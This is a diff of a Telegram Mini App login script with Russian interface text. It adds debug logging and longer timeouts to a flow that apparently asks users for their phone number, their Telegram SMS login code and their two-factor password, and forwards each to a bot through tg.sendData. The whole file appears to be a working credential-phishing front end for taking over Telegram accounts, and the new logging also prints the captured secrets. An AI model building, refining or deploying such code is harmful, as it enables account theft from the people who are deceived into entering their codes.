@@ -17,6 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStep = 'contact';  // Шаги: contact, phone, code, 2fa
 
     loginBtn.addEventListener('click', () => {
+        console.log('Login button clicked');
         loginBtn.style.opacity = '0';
         setTimeout(() => loginBtn.classList.add('hidden'), 300);
         authForm.classList.remove('hidden');
@@ -26,6 +27,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         tg.requestContact()
             .then((contact) => {
+                console.log('Contact received:', contact);
                 if (contact && contact.phone_number) {
                     phoneInput.value = contact.phone_number;
                     phoneInput.classList.remove('hidden');
@@ -51,22 +53,25 @@ document.addEventListener('DOMContentLoaded', () => {
     submitBtn.addEventListener('click', () => {
         const step = currentStep;
         let payload = {};
+        console.log('Submit clicked, step:', step);
 
         if (step === 'phone') {
             payload = { action: 'share_phone', phone: phoneInput.value };
+            console.log('Sending phone data:', payload);
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Отправляем номер боту...';
             tg.HapticFeedback.notificationOccurred('success');
-            // Переход к следующему шагу
+            // Увеличенный таймаут для ожидания SMS
             setTimeout(() => {
+                console.log('Timeout: Showing code input');
                 hideLoading();
                 phoneInput.classList.add('hidden');
                 codeInput.classList.remove('hidden');
                 submitBtn.textContent = 'Отправить код';
-                statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат для подтверждения).';
+                statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат и SMS).';
                 currentStep = 'code';
-            }, 1500);
+            }, 3000);  // 3 секунды для стабильности
             return;
         }
 
@@ -78,12 +83,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
             payload = { action: 'verify_code', code: code };
+            console.log('Sending code data:', payload);
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            // Переход к 2FA
+            // Таймаут для перехода к 2FA
             setTimeout(() => {
+                console.log('Timeout: Showing 2FA input');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
@@ -97,12 +104,14 @@ document.addEventListener('DOMContentLoaded', () => {
         if (step === '2fa') {
             const password = twoFaInput.value;
             payload = { action: 'verify_2fa', password: password };
+            console.log('Sending 2FA data:', payload);
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.HapticFeedback.impactOccurred('heavy');
             // Показываем success (бот уточнит в чате)
             setTimeout(() => {
+                console.log('Timeout: Showing success');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
@@ -117,14 +126,17 @@ document.addEventListener('DOMContentLoaded', () => {
         loadingSpinner.classList.remove('hidden');
         submitBtn.disabled = true;
         errorMsg.classList.add('hidden');
+        console.log('Showing loading');
     }
 
     function hideLoading() {
         loadingSpinner.classList.add('hidden');
         submitBtn.disabled = false;
+        console.log('Hiding loading');
     }
 
     function resetForm() {
+        console.log('Resetting form');
         authForm.classList.add('hidden');
         loginBtn.classList.remove('hidden');
         loginBtn.style.opacity = '1';
@@ -140,6 +152,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Событие после отправки данных
     tg.onEvent('webAppDataSent', () => {
+        console.log('WebApp data sent');
         tg.HapticFeedback.impactOccurred('light');
     });
 });
